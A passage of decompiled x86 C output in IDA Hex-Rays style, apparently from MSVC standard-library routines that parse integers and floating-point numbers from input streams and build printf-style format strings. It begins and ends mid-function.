  char v164[4]; // [esp+1Ch] [ebp-8Ch] BYREF
  int v165; // [esp+20h] [ebp-88h]
  char *v166; // [esp+24h] [ebp-84h]
  unsigned int v167; // [esp+28h] [ebp-80h]
  void **v168; // [esp+2Ch] [ebp-7Ch]
  int v169; // [esp+30h] [ebp-78h]
  char *v170; // [esp+34h] [ebp-74h]
  int v171; // [esp+38h] [ebp-70h]
  char v172; // [esp+3Eh] [ebp-6Ah]
  char v173; // [esp+3Fh] [ebp-69h]
  int v174; // [esp+40h] [ebp-68h]
  char v175; // [esp+47h] [ebp-61h]
  int v176[5]; // [esp+48h] [ebp-60h] BYREF
  unsigned int v177; // [esp+5Ch] [ebp-4Ch]
  void *v178[5]; // [esp+60h] [ebp-48h] BYREF
  unsigned int v179; // [esp+74h] [ebp-34h]
  char Buf[22]; // [esp+78h] [ebp-30h] BYREF
  char v181; // [esp+8Eh] [ebp-1Ah]
  char v182; // [esp+8Fh] [ebp-19h]
  char v183; // [esp+90h] [ebp-18h]
  char v184; // [esp+91h] [ebp-17h]
  char v185; // [esp+92h] [ebp-16h]
  char v186; // [esp+93h] [ebp-15h]
  char v187; // [esp+94h] [ebp-14h] BYREF
  int v188; // [esp+A4h] [ebp-4h]
  int savedregs; // [esp+A8h] [ebp+0h] BYREF

  v174 = a4;
  v165 = *(_DWORD *)(*(_DWORD *)(a5 + 48) + 4);
  (*(void (**)(void))(*(_DWORD *)v165 + 4))();
  v188 = 0;
  v6 = sub_42A3A0((int)v164);
  v188 = -1;
  v7 = v6;
  v163 = v6;
  if ( v165 )
  {
    v8 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v165 + 8))(v165);
    if ( v8 )
      (**v8)(v8, 1);
  }
  (*(void (__thiscall **)(struct std::_Facet_base *, int *))(*(_DWORD *)v7 + 20))(v7, v176);
  v9 = *(_DWORD *)(a5 + 48);
  v188 = 1;
  v165 = *(_DWORD *)(v9 + 4);
  v10 = v165;
  (*(void (__thiscall **)(int))(*(_DWORD *)v10 + 4))(v10);
  LOBYTE(v188) = 2;
  v11 = sub_421800((int)&savedregs, (int)v164);
  LOBYTE(v188) = 1;
  v12 = v11;
  if ( v10 )
  {
    v13 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v10 + 8))(v10);
    if ( v13 )
      (**v13)(v13, 1);
  }
  (*(void (__thiscall **)(char *, const char *, void *, char *))(*(_DWORD *)v12 + 28))(
    v12,
    "0123456789ABCDEFabcdef-+XxPp",
    &unk_4B8825,
    Buf);
  v14 = a2;
  v172 = 0;
  if ( !sub_429020((int)a3, v174) )
  {
    if ( !a3[4] )
    {
      v15 = *(_DWORD ***)a3;
      if ( !*(_DWORD *)a3
        || ((v16 = (unsigned __int8 *)*v15[7]) == 0 || (int)*v15[11] <= 0
          ? (v17 = ((int (__thiscall *)(_DWORD **))(*v15)[6])(v15))
          : (v17 = *v16),
            v17 == -1) )
      {
        *(_DWORD *)a3 = 0;
      }
      else
      {
        a3[5] = v17;
      }
      a3[4] = 1;
    }
    v18 = a3;
    if ( a3[5] == v182 )
    {
      *a2 = 43;
    }
    else
    {
      v19 = sub_42ADB0(a3);
      if ( v19 != v181 )
        goto LABEL_23;
      *a2 = 45;
      v18 = a3;
    }
    v14 = a2 + 1;
    sub_42AE00(v18);
  }
LABEL_23:
  v156 = v174;
  *v14 = 30768;
  v20 = 0;
  v21 = (char *)(v14 + 1);
  v175 = 0;
  v170 = v21;
  v169 = 0;
  v171 = 0;
  if ( !sub_429020((int)a3, v156) )
  {
    if ( !a3[4] )
    {
      v22 = *(_DWORD ***)a3;
      if ( !*(_DWORD *)a3
        || ((v23 = (unsigned __int8 *)*v22[7]) == 0 || (int)*v22[11] <= 0
          ? (v24 = ((int (__thiscall *)(_DWORD **))(*v22)[6])(v22))
          : (v24 = *v23),
            v24 == -1) )
      {
        *(_DWORD *)a3 = 0;
      }
      else
      {
        a3[5] = v24;
      }
      a3[4] = 1;
    }
    if ( a3[5] == Buf[0] )
    {
      v25 = sub_42AE00(a3);
      if ( !sub_429020((int)v25, v174) && ((v26 = sub_42ADB0(a3), v26 == v184) || (v27 = sub_42ADB0(a3), v27 == v183)) )
        sub_42AE00(a3);
      else
        v175 = 1;
    }
  }
  v28 = 36;
  if ( *a6 == 1000000000 )
    v28 = 768;
  v165 = v28;
  v29 = (char *)v176;
  if ( v177 >= 0x10 )
    v29 = (char *)v176[0];
  v166 = v29;
  v30 = *v29;
  if ( v30 != 127 && v30 > 0 )
  {
    if ( v176[4] )
      v173 = (*(int (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v163 + 16))(v163);
    else
      v173 = 0;
    v31 = 15;
    v167 = 15;
    v179 = 15;
    v178[4] = (void *)1;
    LOWORD(v178[0]) = 0;
    LOBYTE(v188) = 3;
    v32 = 0;
    if ( sub_429020((int)a3, v174) )
    {
      v52 = (void **)v178[0];
      goto LABEL_97;
    }
    v168 = (void **)v178[0];
    while ( 1 )
    {
      if ( !a3[4] )
      {
        v33 = *(_DWORD ***)a3;
        if ( !*(_DWORD *)a3
          || ((v34 = (unsigned __int8 *)*v33[7]) == 0 || (int)*v33[11] <= 0
            ? (v35 = ((int (__thiscall *)(_DWORD **))(*v33)[6])(v33))
            : (v35 = *v34),
              v35 == -1) )
        {
          *(_DWORD *)a3 = 0;
        }
        else
        {
          a3[5] = v35;
        }
        a3[4] = 1;
      }
      v36 = a3[5];
      v37 = (char *)memchr(Buf, v36, 0x1Cu);
      v38 = &v187;
      if ( v37 )
        v38 = v37;
      v39 = v38 - Buf;
      if ( v39 >= 0x16 )
      {
        v45 = v178;
        if ( v167 >= 0x10 )
          v45 = v168;
        if ( !*((_BYTE *)v45 + v32) || !v173 || v36 != v173 )
        {
LABEL_91:
          v31 = v167;
          v52 = v168;
          if ( v32 )
          {
            v53 = v178;
            if ( v167 >= 0x10 )
              v53 = v168;
            if ( *((char *)v53 + v32) > 0 )
            {
              ++v32;
              goto LABEL_97;
            }
LABEL_110:
            v172 = 1;
          }
          else
          {
LABEL_97:
            v54 = v166;
            while ( v32 )
            {
              v55 = *v54;
              if ( *v54 == 127 )
                break;
              if ( --v32 )
              {
                v56 = v178;
                if ( v31 >= 0x10 )
                  v56 = v52;
                if ( v55 != *((_BYTE *)v56 + v32) )
                  goto LABEL_110;
              }
              if ( !v32 )
              {
                v57 = v178;
                if ( v31 >= 0x10 )
                  v57 = v52;
                if ( v55 < *(char *)v57 )
                  goto LABEL_110;
              }
              v54 = v166 + 1;
              if ( v166[1] <= 0 )
                goto LABEL_97;
              ++v166;
            }
          }
          LOBYTE(v188) = 1;
          if ( v31 >= 0x10 )
          {
            v58 = v52;
            if ( v31 + 1 < 0x1000 || (v52 = (void **)*(v52 - 1), (unsigned int)((char *)v58 - (char *)v52 - 4) <= 0x1F) )
            {
              sub_46C87D(v52);
              goto LABEL_115;
            }
LABEL_329:
            _invalid_parameter_noinfo_noreturn();
          }
LABEL_115:
          v20 = v169;
          v21 = v170;
LABEL_116:
          if ( v175 )
            goto LABEL_117;
          goto LABEL_119;
        }
        sub_41ED20(v178, 0);
        ++v32;
        v167 = v179;
      }
      else
      {
        v40 = v169;
        v175 = 1;
        if ( v165 > v169 )
        {
          if ( v39 || v169 )
          {
            v41 = a0123456789abcd[v39];
            v42 = v170;
            *v170 = v41;
            v170 = v42 + 1;
            v169 = v40 + 1;
          }
        }
        else
        {
          ++v171;
        }
        v43 = v178;
        if ( v167 >= 0x10 )
          v43 = v168;
        if ( *((_BYTE *)v43 + v32) == 127 )
          goto LABEL_82;
        v44 = v178;
        if ( v167 >= 0x10 )
          v44 = v168;
        ++*((_BYTE *)v44 + v32);
        v167 = v179;
      }
      v168 = (void **)v178[0];
LABEL_82:
      v46 = *(_DWORD ***)a3;
      if ( !*(_DWORD *)a3
        || (!*v46[7] || (v47 = v46[11], *v47 <= 0)
          ? (v50 = ((int (__thiscall *)(_DWORD **))(*v46)[7])(v46))
          : (--*v47, v48 = (unsigned __int8 **)v46[7], v49 = *v48, ++*v48, v50 = *v49),
            v50 == -1) )
      {
        *(_DWORD *)a3 = 0;
        v51 = 1;
      }
      else
      {
        v51 = 0;
      }
      v157 = v174;
      a3[4] = v51;
      if ( sub_429020((int)a3, v157) )
        goto LABEL_91;
    }
  }
  if ( sub_429020((int)a3, v174) )
    goto LABEL_116;
  do
  {
    if ( !a3[4] )
    {
      v62 = *(_DWORD ***)a3;
      if ( !*(_DWORD *)a3
        || ((v63 = (unsigned __int8 *)*v62[7]) == 0 || (int)*v62[11] <= 0
          ? (v64 = ((int (__thiscall *)(_DWORD **))(*v62)[6])(v62))
          : (v64 = *v63),
            v64 == -1) )
      {
        *(_DWORD *)a3 = 0;
      }
      else
      {
        a3[5] = v64;
      }
      a3[4] = 1;
    }
    v65 = (char *)memchr(Buf, (unsigned __int8)a3[5], 0x1Cu);
    v66 = &v187;
    if ( v65 )
      v66 = v65;
    v67 = v66 - Buf;
    if ( v67 >= 0x16 )
      goto LABEL_116;
    if ( v165 > v20 )
    {
      if ( v67 || v20 )
      {
        *v21++ = a0123456789abcd[v67];
        ++v20;
        v170 = v21;
        v169 = v20;
      }
    }
    else
    {
      ++v171;
    }
    v68 = *(_DWORD ***)a3;
    v175 = 1;
    if ( !v68
      || (!*v68[7] || (v69 = v68[11], *v69 <= 0)
        ? (v72 = ((int (__thiscall *)(_DWORD **))(*v68)[7])(v68))
        : (--*v69, v70 = (unsigned __int8 **)v68[7], v71 = *v70, ++*v70, v72 = *v71),
          v72 == -1) )
    {
      *(_DWORD *)a3 = 0;
      v73 = 1;
    }
    else
    {
      v73 = 0;
    }
    v158 = v174;
    a3[4] = v73;
  }
  while ( !sub_429020((int)a3, v158) );
LABEL_117:
  if ( !v20 )
  {
    *v21++ = 48;
    v170 = v21;
  }
LABEL_119:
  if ( !sub_429020((int)a3, v174) )
  {
    if ( !a3[4] )
    {
      v59 = *(_DWORD ***)a3;
      if ( !*(_DWORD *)a3
        || ((v60 = (unsigned __int8 *)*v59[7]) == 0 || (int)*v59[11] <= 0
          ? (v61 = ((int (__thiscall *)(_DWORD **))(*v59)[6])(v59))
          : (v61 = *v60),
            v61 == -1) )
      {
        *(_DWORD *)a3 = 0;
      }
      else
      {
        a3[5] = v61;
      }
      a3[4] = 1;
    }
    v74 = a3[5];
    if ( v74 == (*(unsigned __int8 (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v163 + 12))(v163) )
    {
      *v21++ = *localeconv()->decimal_point;
      v75 = *(_DWORD ***)a3;
      v170 = v21;
      if ( !v75
        || (!*v75[7] || (v76 = v75[11], *v76 <= 0)
          ? (v79 = ((int (__thiscall *)(_DWORD **))(*v75)[7])(v75))
          : (--*v76, v77 = (unsigned __int8 **)v75[7], v78 = *v77, ++*v77, v79 = *v78),
            v79 == -1) )
      {
        *(_DWORD *)a3 = 0;
        a3[4] = 1;
      }
      else
      {
        a3[4] = 0;
      }
    }
  }
  v80 = v169;
  if ( !v169 )
  {
    if ( !sub_429020((int)a3, v174) )
    {
      v81 = v174;
      v82 = v171;
      do
      {
        if ( !a3[4] )
        {
          v83 = *(_DWORD ***)a3;
          if ( !*(_DWORD *)a3
            || ((v84 = (unsigned __int8 *)*v83[7]) == 0 || (int)*v83[11] <= 0
              ? (v85 = ((int (__thiscall *)(_DWORD **))(*v83)[6])(v83))
              : (v85 = *v84),
                v85 == -1) )
          {
            *(_DWORD *)a3 = 0;
          }
          else
          {
            a3[5] = v85;
          }
          a3[4] = 1;
        }
        if ( a3[5] != Buf[0] )
          break;
        v86 = *(_DWORD ***)a3;
        --v82;
        v175 = 1;
        if ( !v86
          || (!*v86[7] || (v87 = v86[11], *v87 <= 0)
            ? (v90 = ((int (__thiscall *)(_DWORD **))(*v86)[7])(v86))
            : (--*v87, v88 = (unsigned __int8 **)v86[7], v89 = *v88, ++*v88, v90 = *v89),
              v90 == -1) )
        {
          *(_DWORD *)a3 = 0;
          v91 = 1;
        }
        else
        {
          v91 = 0;
        }
        a3[4] = v91;
      }
      while ( !sub_429020((int)a3, v81) );
      v80 = v169;
      v171 = v82;
      v21 = v170;
    }
    v92 = v171;
    if ( v171 < 0 )
    {
      *v21++ = 48;
      v171 = v92 + 1;
    }
  }
  if ( !sub_429020((int)a3, v174) )
  {
    while ( 1 )
    {
      if ( !a3[4] )
      {
        v93 = *(_DWORD ***)a3;
        if ( !*(_DWORD *)a3
          || ((v94 = (unsigned __int8 *)*v93[7]) == 0 || (int)*v93[11] <= 0
            ? (v95 = ((int (__thiscall *)(_DWORD **))(*v93)[6])(v93))
            : (v95 = *v94),
              v95 == -1) )
        {
          *(_DWORD *)a3 = 0;
        }
        else
        {
          a3[5] = v95;
        }
        a3[4] = 1;
      }
      v96 = (char *)memchr(Buf, (unsigned __int8)a3[5], 0x1Cu);
      v97 = &v187;
      if ( v96 )
        v97 = v96;
      v98 = v97 - Buf;
      if ( v98 >= 0x16 )
        break;
      if ( v80 < v165 )
      {
        *v21++ = a0123456789abcd[v98];
        ++v80;
      }
      v99 = *(_DWORD ***)a3;
      v175 = 1;
      if ( !v99
        || (!*v99[7] || (v100 = v99[11], *v100 <= 0)
          ? (v103 = ((int (__thiscall *)(_DWORD **))(*v99)[7])(v99))
          : (--*v100, v101 = (unsigned __int8 **)v99[7], v102 = *v101, ++*v101, v103 = *v102),
            v103 == -1) )
      {
        *(_DWORD *)a3 = 0;
        v104 = 1;
      }
      else
      {
        v104 = 0;
      }
      v159 = v174;
      a3[4] = v104;
      if ( sub_429020((int)a3, v159) )
        goto LABEL_221;
    }
  }
  v105 = v175;
  if ( v175 )
  {
LABEL_221:
    if ( !sub_429020((int)a3, v174) )
    {
      if ( !a3[4] )
      {
        v106 = *(_DWORD ***)a3;
        if ( !*(_DWORD *)a3
          || ((v107 = (unsigned __int8 *)*v106[7]) == 0 || (int)*v106[11] <= 0
            ? (v108 = ((int (__thiscall *)(_DWORD **))(*v106)[6])(v106))
            : (v108 = *v107),
              v108 == -1) )
        {
          *(_DWORD *)a3 = 0;
        }
        else
        {
          a3[5] = v108;
        }
        a3[4] = 1;
      }
      v109 = a3[5];
      if ( v109 == v186 || v109 == v185 )
      {
        *v21++ = 112;
        v110 = *(_DWORD ***)a3;
        if ( !*(_DWORD *)a3
          || (!*v110[7] || (v111 = v110[11], *v111 <= 0)
            ? (v114 = ((int (__thiscall *)(_DWORD **))(*v110)[7])(v110))
            : (--*v111, v112 = (unsigned __int8 **)v110[7], v113 = *v112, ++*v112, v114 = *v113),
              v114 == -1) )
        {
          *(_DWORD *)a3 = 0;
          v115 = 1;
        }
        else
        {
          v115 = 0;
        }
        v160 = v174;
        a3[4] = v115;
        v116 = 0;
        v175 = 0;
        if ( !sub_429020((int)a3, v160) )
        {
          if ( !a3[4] )
          {
            v117 = *(_DWORD ***)a3;
            if ( !*(_DWORD *)a3
              || ((v118 = (unsigned __int8 *)*v117[7]) == 0 || (int)*v117[11] <= 0
                ? (v119 = ((int (__thiscall *)(_DWORD **))(*v117)[6])(v117))
                : (v119 = *v118),
                  v119 == -1) )
            {
              *(_DWORD *)a3 = 0;
            }
            else
            {
              a3[5] = v119;
            }
            a3[4] = 1;
          }
          v120 = a3[5];
          if ( v120 == v182 )
          {
            *v21++ = 43;
            v121 = *(_DWORD ***)a3;
            if ( !*(_DWORD *)a3
              || (!*v121[7] || (v122 = v121[11], *v122 <= 0)
                ? (v125 = ((int (__thiscall *)(_DWORD **))(*v121)[7])(v121))
                : (--*v122, v123 = (unsigned __int8 **)v121[7], v124 = *v123, ++*v123, v125 = *v124),
                  v125 == -1) )
            {
              *(_DWORD *)a3 = 0;
              a3[4] = 1;
            }
            else
            {
              a3[4] = 0;
            }
          }
          else if ( v120 == v181 )
          {
            *v21++ = 45;
            v126 = *(_DWORD ***)a3;
            if ( !*(_DWORD *)a3
              || (!*v126[7] || (v127 = v126[11], *v127 <= 0)
                ? (v130 = ((int (__thiscall *)(_DWORD **))(*v126)[7])(v126))
                : (--*v127, v128 = (unsigned __int8 **)v126[7], v129 = *v128, ++*v128, v130 = *v129),
                  v130 == -1) )
            {
              *(_DWORD *)a3 = 0;
              a3[4] = 1;
            }
            else
            {
              a3[4] = 0;
            }
          }
        }
        if ( !sub_429020((int)a3, v174) )
        {
          while ( 1 )
          {
            if ( !a3[4] )
            {
              v131 = *(_DWORD ***)a3;
              if ( !*(_DWORD *)a3
                || ((v132 = (unsigned __int8 *)*v131[7]) == 0 || (int)*v131[11] <= 0
                  ? (v133 = ((int (__thiscall *)(_DWORD **))(*v131)[6])(v131))
                  : (v133 = *v132),
                    v133 == -1) )
              {
                *(_DWORD *)a3 = 0;
              }
              else
              {
                a3[5] = v133;
              }
              a3[4] = 1;
            }
            if ( a3[5] != Buf[0] )
              break;
            v134 = *(_DWORD ***)a3;
            v175 = 1;
            if ( !v134
              || (!*v134[7] || (v135 = v134[11], *v135 <= 0)
                ? (v138 = ((int (__thiscall *)(_DWORD **))(*v134)[7])(v134))
                : (--*v135, v136 = (unsigned __int8 **)v134[7], v137 = *v136, ++*v136, v138 = *v137),
                  v138 == -1) )
            {
              *(_DWORD *)a3 = 0;
              v139 = 1;
            }
            else
            {
              v139 = 0;
            }
            v161 = v174;
            a3[4] = v139;
            if ( sub_429020((int)a3, v161) )
              goto LABEL_294;
          }
          if ( !v175 )
            goto LABEL_295;
LABEL_294:
          *v21++ = 48;
        }
LABEL_295:
        if ( !sub_429020((int)a3, v174) )
        {
          do
          {
            if ( !a3[4] )
            {
              v140 = *(_DWORD ***)a3;
              if ( !*(_DWORD *)a3
                || ((v141 = (unsigned __int8 *)*v140[7]) == 0 || (int)*v140[11] <= 0
                  ? (v142 = ((int (__thiscall *)(_DWORD **))(*v140)[6])(v140))
                  : (v142 = *v141),
                    v142 == -1) )
              {
                *(_DWORD *)a3 = 0;
              }
              else
              {
                a3[5] = v142;
              }
              a3[4] = 1;
            }
            v143 = (char *)memchr(Buf, (unsigned __int8)a3[5], 0x1Cu);
            v144 = &v187;
            if ( v143 )
              v144 = v143;
            v145 = v144 - Buf;
            if ( v145 >= 0x16 )
              break;
            if ( v116 < 8 )
            {
              *v21++ = a0123456789abcd[v145];
              ++v116;
            }
            v146 = *(_DWORD ***)a3;
            v175 = 1;
            if ( !v146
              || (!*v146[7] || (v147 = v146[11], *v147 <= 0)
                ? (v150 = ((int (__thiscall *)(_DWORD **))(*v146)[7])(v146))
                : (--*v147, v148 = (unsigned __int8 **)v146[7], v149 = *v148, ++*v148, v150 = *v149),
                  v150 == -1) )
            {
              *(_DWORD *)a3 = 0;
              v151 = 1;
            }
            else
            {
              v151 = 0;
            }
            v162 = v174;
            a3[4] = v151;
          }
          while ( !sub_429020((int)a3, v162) );
        }
      }
    }
    v105 = v175;
  }
  if ( v172 || !v105 )
    v21 = a2;
  v152 = v177;
  v153 = v171;
  *v21 = 0;
  *a6 = v153;
  if ( v152 >= 0x10 )
  {
    v154 = (void *)v176[0];
    if ( v152 + 1 >= 0x1000 )
    {
      v154 = *(void **)(v176[0] - 4);
      if ( (unsigned int)(v176[0] - (_DWORD)v154 - 4) > 0x1F )
        goto LABEL_329;
    }
    sub_46C87D(v154);
  }
  return 0;
}
// 42C993: conditional instruction was optimized away because bh.1!=0
// 42CEDD: conditional instruction was optimized away because al.1!=0
// 42D01B: conditional instruction was optimized away because al.1!=0
// 42C5F0: using guessed type char var_8C[4];

//----- (0042D2C0) --------------------------------------------------------
int __cdecl sub_42D2C0(int a1, char *a2, _BYTE *a3, int a4, __int16 a5, int a6)
{
  struct std::_Facet_base *v6; // edi
  char *v7; // eax
  _DWORD **v8; // ecx
  unsigned __int8 *v9; // edx
  int v10; // eax
  _BYTE *v11; // ecx
  char v12; // al
  int v13; // ebx
  int v14; // ebx
  _DWORD **v15; // ecx
  unsigned __int8 *v16; // edx
  int v17; // eax
  char v18; // al
  char v19; // al
  int v20; // eax
  int v21; // edi
  _DWORD **v22; // ecx
  unsigned __int8 *v23; // edx
  int v24; // eax
  unsigned __int8 v25; // bl
  char *v26; // eax
  char *v27; // ecx
  unsigned int v28; // ecx
  char v29; // al
  void **v30; // eax
  void **v31; // eax
  void **v32; // eax
  _DWORD **v33; // ecx
  int *v34; // edx
  unsigned __int8 **v35; // ecx
  unsigned __int8 *v36; // edx
  int v37; // eax
  char v38; // al
  void **v39; // ebx
  void **v40; // eax
  int *v41; // edx
  char *v42; // esi
  char v43; // cl
  void **v44; // eax
  void **v45; // eax
  char *v46; // eax
  void **v47; // eax
  char *v48; // eax
  unsigned int v50; // [esp+10h] [ebp-7Ch]
  int v51; // [esp+1Ch] [ebp-70h]
  char *v52; // [esp+20h] [ebp-6Ch]
  void **v53; // [esp+24h] [ebp-68h]
  unsigned int v54; // [esp+28h] [ebp-64h]
  char v55; // [esp+2Dh] [ebp-5Fh]
  char v56; // [esp+2Eh] [ebp-5Eh]
  unsigned __int8 v57; // [esp+2Fh] [ebp-5Dh]
  int v58[5]; // [esp+30h] [ebp-5Ch] BYREF
  unsigned int v59; // [esp+44h] [ebp-48h]
  void *v60[5]; // [esp+48h] [ebp-44h] BYREF
  unsigned int v61; // [esp+5Ch] [ebp-30h]
  char Buf[26]; // [esp+60h] [ebp-2Ch] BYREF
  char v63; // [esp+7Ah] [ebp-12h] BYREF
  int v64; // [esp+88h] [ebp-4h]
  int savedregs; // [esp+8Ch] [ebp+0h] BYREF

  v6 = sub_42A3A0(a6);
  (*(void (__thiscall **)(struct std::_Facet_base *, int *))(*(_DWORD *)v6 + 20))(v6, v58);
  v64 = 0;
  if ( v58[4] )
    v56 = (*(int (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v6 + 16))(v6);
  else
    v56 = 0;
  v7 = sub_421800((int)&savedregs, a6);
  (*(void (__thiscall **)(char *, const char *, void *, char *))(*(_DWORD *)v7 + 28))(
    v7,
    "0123456789ABCDEFabcdef-+Xx",
    &unk_4B8807,
    Buf);
  v52 = a2;
  if ( !sub_429020((int)a3, a4) )
  {
    if ( !a3[4] )
    {
      v8 = *(_DWORD ***)a3;
      if ( !*(_DWORD *)a3
        || ((v9 = (unsigned __int8 *)*v8[7]) == 0 || (int)*v8[11] <= 0
          ? (v10 = ((int (__thiscall *)(_DWORD **))(*v8)[6])(v8))
          : (v10 = *v9),
            v10 == -1) )
      {
        *(_DWORD *)a3 = 0;
      }
      else
      {
        a3[5] = v10;
      }
      a3[4] = 1;
    }
    v11 = a3;
    if ( a3[5] == Buf[23] )
    {
      *a2 = 43;
LABEL_19:
      v52 = a2 + 1;
      sub_42AE00(v11);
      goto LABEL_20;
    }
    v12 = sub_42ADB0(a3);
    if ( v12 == Buf[22] )
    {
      *a2 = 45;
      v11 = a3;
      goto LABEL_19;
    }
  }
LABEL_20:
  v13 = a5 & 0xE00;
  if ( v13 == 1024 )
  {
    v14 = 8;
  }
  else if ( v13 == 2048 )
  {
    v14 = 16;
  }
  else
  {
    v14 = v13 != 0 ? 0xA : 0;
  }
  v51 = v14;
  v57 = 0;
  v55 = 0;
  if ( sub_429020((int)a3, a4) )
    goto LABEL_45;
  if ( !a3[4] )
  {
    v15 = *(_DWORD ***)a3;
    if ( !*(_DWORD *)a3
      || ((v16 = (unsigned __int8 *)*v15[7]) == 0 || (int)*v15[11] <= 0
        ? (v17 = ((int (__thiscall *)(_DWORD **))(*v15)[6])(v15))
        : (v17 = *v16),
          v17 == -1) )
    {
      *(_DWORD *)a3 = 0;
    }
    else
    {
      a3[5] = v17;
    }
    a3[4] = 1;
  }
  if ( a3[5] != Buf[0] )
  {
LABEL_45:
    if ( !v14 )
      goto LABEL_50;
  }
  else
  {
    v57 = 1;
    sub_42AE00(a3);
    if ( !sub_429020((int)a3, a4) )
    {
      v18 = sub_42ADB0(a3);
      if ( v18 == Buf[25] || (v19 = sub_42ADB0(a3), v19 == Buf[24]) )
      {
        if ( !v14 || v14 == 16 )
        {
          v14 = 16;
          v57 = 0;
          v51 = 16;
          sub_42AE00(a3);
LABEL_47:
          v20 = 22;
          if ( v14 == 8 )
            v20 = 8;
          v50 = v20;
          goto LABEL_51;
        }
      }
    }
    if ( !v14 )
    {
      v14 = 8;
      v51 = 8;
      goto LABEL_47;
    }
  }
  if ( v14 != 10 )
    goto LABEL_47;
LABEL_50:
  v50 = 10;
LABEL_51:
  v54 = 15;
  v61 = 15;
  v60[4] = (void *)1;
  LOWORD(v60[0]) = v57;
  LOBYTE(v64) = 1;
  v21 = 0;
  if ( sub_429020((int)a3, a4) )
  {
    v39 = (void **)v60[0];
    goto LABEL_99;
  }
  v53 = (void **)v60[0];
  while ( 1 )
  {
    if ( !a3[4] )
    {
      v22 = *(_DWORD ***)a3;
      if ( !*(_DWORD *)a3
        || ((v23 = (unsigned __int8 *)*v22[7]) == 0 || (int)*v22[11] <= 0
          ? (v24 = ((int (__thiscall *)(_DWORD **))(*v22)[6])(v22))
          : (v24 = *v23),
            v24 == -1) )
      {
        *(_DWORD *)a3 = 0;
      }
      else
      {
        a3[5] = v24;
      }
      a3[4] = 1;
    }
    v25 = a3[5];
    v26 = (char *)memchr(Buf, v25, 0x1Au);
    v27 = &v63;
    if ( v26 )
      v27 = v26;
    v28 = v27 - Buf;
    if ( v28 >= v50 )
      break;
    v29 = a0123456789abcd_0[v28];
    *v52 = v29;
    if ( (v55 || v29 != 48) && v52 < a2 + 31 )
    {
      v55 = 1;
      ++v52;
    }
    v30 = v60;
    v57 = 1;
    if ( v54 >= 0x10 )
      v30 = v53;
    if ( *((_BYTE *)v30 + v21) == 127 )
      goto LABEL_83;
    v31 = v60;
    if ( v54 >= 0x10 )
      v31 = v53;
    ++*((_BYTE *)v31 + v21);
LABEL_82:
    v53 = (void **)v60[0];
    v54 = v61;
LABEL_83:
    v33 = *(_DWORD ***)a3;
    if ( !*(_DWORD *)a3
      || (!*v33[7] || (v34 = v33[11], *v34 <= 0)
        ? (v37 = ((int (__thiscall *)(_DWORD **))(*v33)[7])(v33))
        : (--*v34, v35 = (unsigned __int8 **)v33[7], v36 = *v35, ++*v35, v37 = *v36),
          v37 == -1) )
    {
      *(_DWORD *)a3 = 0;
      v38 = 1;
    }
    else
    {
      v38 = 0;
    }
    a3[4] = v38;
    if ( sub_429020((int)a3, a4) )
      goto LABEL_92;
  }
  v32 = v60;
  if ( v54 >= 0x10 )
    v32 = v53;
  if ( *((_BYTE *)v32 + v21) && v56 && v25 == v56 )
  {
    sub_41ED20(v60, 0);
    ++v21;
    goto LABEL_82;
  }
LABEL_92:
  v39 = v53;
  if ( v21 )
  {
    v40 = v60;
    if ( v54 >= 0x10 )
      v40 = v53;
    if ( *((char *)v40 + v21) <= 0 )
      v57 = 0;
    else
      ++v21;
  }
LABEL_99:
  v41 = v58;
  v42 = (char *)v58[0];
  if ( v59 >= 0x10 )
    v41 = (int *)v58[0];
  if ( v57 )
  {
    while ( v21 )
    {
      v43 = *(_BYTE *)v41;
      if ( *(_BYTE *)v41 == 127 )
        break;
      if ( --v21 )
      {
        v44 = v60;
        if ( v54 >= 0x10 )
          v44 = v39;
        if ( v43 != *((_BYTE *)v44 + v21) )
          goto LABEL_116;
      }
      if ( !v21 )
      {
        v45 = v60;
        if ( v54 >= 0x10 )
          v45 = v39;
        if ( v43 < *(char *)v45 )
          goto LABEL_116;
      }
      if ( *((char *)v41 + 1) > 0 )
        v41 = (int *)((char *)v41 + 1);
    }
    v46 = v52;
    if ( !v55 )
    {
      *v52 = 48;
      v46 = v52 + 1;
    }
  }
  else
  {
LABEL_116:
    v46 = a2;
  }
  *v46 = 0;
  if ( v54 >= 0x10 )
  {
    v47 = v39;
    if ( v54 + 1 < 0x1000 || (v39 = (void **)*(v39 - 1), (unsigned int)((char *)v47 - (char *)v39 - 4) <= 0x1F) )
    {
      sub_46C87D(v39);
      v42 = (char *)v58[0];
      goto LABEL_121;
    }
LABEL_126:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_121:
  if ( v59 >= 0x10 )
  {
    v48 = v42;
    if ( v59 + 1 >= 0x1000 )
    {
      v42 = (char *)*((_DWORD *)v42 - 1);
      if ( (unsigned int)(v48 - v42 - 4) > 0x1F )
        goto LABEL_126;
    }
    sub_46C87D(v42);
  }
  return v51;
}
// 42D600: conditional instruction was optimized away because %var_60.1!=0

//----- (0042D7D0) --------------------------------------------------------
_BYTE *__cdecl sub_42D7D0(int a1, _BYTE *a2, _BYTE *a3, __int16 a4)
{
  _BYTE *v4; // ecx
  _BYTE *v5; // edx
  int v6; // ecx
  _BYTE *result; // eax

  *a2 = 37;
  v4 = a2 + 1;
  if ( (a4 & 0x20) != 0 )
  {
    *v4 = 43;
    v4 = a2 + 2;
  }
  if ( (a4 & 8) != 0 )
    *v4++ = 35;
  v5 = v4 + 1;
  if ( *a3 == 76 )
  {
    *v4 = 73;
    *(_WORD *)v5 = 13366;
    v5 = v4 + 3;
  }
  else
  {
    *v4 = *a3;
  }
  v6 = a4 & 0xE00;
  if ( v6 == 1024 )
  {
    *v5 = 111;
    result = a2;
    v5[1] = 0;
  }
  else
  {
    if ( v6 == 2048 )
      *v5 = ~(8 * a4) & 0x20 | 0x58;
    else
      *v5 = a3[1];
    result = a2;
    v5[1] = 0;
  }
  return result;
}

//----- (0042D860) --------------------------------------------------------
_DWORD *__cdecl sub_42D860(
        int a1,
        _DWORD *a2,
        int a3,
        _DWORD *a4,
        __int64 *a5,
        unsigned __int8 a6,
        _BYTE *a7,
        size_t a8)
{
  size_t v8; // ebx
  BOOL v9; // edi
  int v10; // eax
  char v11; // al
  int v12; // esi
  char *v13; // eax
  char *v14; // edi
  void (__thiscall ***v15)(_DWORD, int); // eax
  void **v16; // eax
  int v17; // edx
